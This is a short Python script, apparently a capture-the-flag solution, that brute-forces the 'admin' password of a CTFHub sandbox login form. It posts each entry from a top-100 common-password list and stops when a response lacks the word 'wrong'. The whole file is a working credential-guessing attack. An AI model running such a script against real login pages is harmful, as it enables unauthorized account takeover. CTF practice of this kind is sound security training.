import requests

def req(username,password):
    r = requests.post(
        url = 'http://challenge-f7ba3fabf142fc15.sandbox.ctfhub.com:10800/',
        headers={
            "Content-Type":"application/x-www-form-urlencoded"
        },
        data="name={}&password={}&referer=".format(username,password)
        )
    
    # print(r.content.decode(),"\n")
    if(not ("wrong" in r.content.decode())):
        print("find:{}",r.content.decode())
        exit()
    

with open('10_million_password_list_top_100.txt', 'r') as file:
    for line in file:
        # print("Current:",line,"\n")
        req('admin',line.strip())